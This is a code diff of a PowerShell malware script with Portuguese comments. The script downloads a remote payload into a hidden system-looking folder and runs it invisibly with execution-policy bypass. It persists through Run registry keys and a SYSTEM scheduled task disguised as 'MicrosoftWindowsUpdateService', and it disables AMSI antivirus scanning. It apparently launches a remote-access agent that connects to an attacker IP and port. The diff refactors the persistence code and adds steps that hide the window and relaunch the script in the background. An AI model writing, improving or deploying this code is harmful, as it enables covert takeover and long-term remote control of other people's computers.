@@ -15,14 +15,6 @@ if (-not $isAdmin) {
     exit
 }
 
-# ===== ESCONDE A JANELA DO POWERSHELL NA HORA =====
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
-[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-'
-$consolePtr = [Console.Window]::GetConsoleWindow()
-[Console.Window]::ShowWindow($consolePtr, 0) # 0 = SW_HIDE
-
 # ===== CAMINHOS E VBS WRAPPER =====
 $dir = "$env:ProgramData\Microsoft\Windows\Caches"
 $scriptPath = "$dir\$installName.ps1"
@@ -31,34 +23,38 @@ $vbsPath = "$dir\$installName.vbs"
 New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
 try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
 
-# Cria o VBS que roda o PowerShell invisível (0 = Hidden, False = Não espera)
+# Cria o VBS que roda o PowerShell invisível
 $vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $scriptPath + '""", 0, False'
 Set-Content -Path $vbsPath -Value $vbsContent -Force -ErrorAction SilentlyContinue
 
 attrib +h +s +r $scriptPath 2>$null
 attrib +h +s +r $vbsPath 2>$null
 
-# ===== PERSISTÊNCIA E AUTO-REPARO =====
-function Install-Persistence {
-    $cmd = "wscript.exe //B //Nologo `"$vbsPath`""
-    try {
-        Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
-    } catch {}
+# ===== PERSISTÊNCIA =====
+$cmd = "wscript.exe //B //Nologo `"$vbsPath`""
+try {
+    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
+} catch {}
 
-    try {
-        $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B //Nologo `"$vbsPath`""
-        $trigger1 = New-ScheduledTaskTrigger -AtStartup
-        $trigger2 = New-ScheduledTaskTrigger -AtLogOn
-        $trigger3 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 365)
-        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable
-        Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1,$trigger2,$trigger3 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
-    } catch {}
+try {
+    $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B //Nologo `"$vbsPath`""
+    $trigger1 = New-ScheduledTaskTrigger -AtStartup
+    $trigger2 = New-ScheduledTaskTrigger -AtLogOn
+    $trigger3 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 365)
+    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable
+    Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1,$trigger2,$trigger3 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
+} catch {}
+
+# ===== FECHA O TERMINAL E RODA EM BACKGROUND =====
+if (-not $env:WinUpdateHidden) {
+    $env:WinUpdateHidden = "1"
+    Start-Process wscript.exe -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
+    exit # Isso fecha a janela do PowerShell na hora
 }
 
-Install-Persistence
-
+# ===== AMSI BYPASS =====
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
 
@@ -96,6 +92,7 @@ if (-not ("R9KAgent" -as [type])) {
 
         public static void Start(string ip, int port) {
             IP = ip; PORT = port;
+            
             Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();
 
             while (true) {
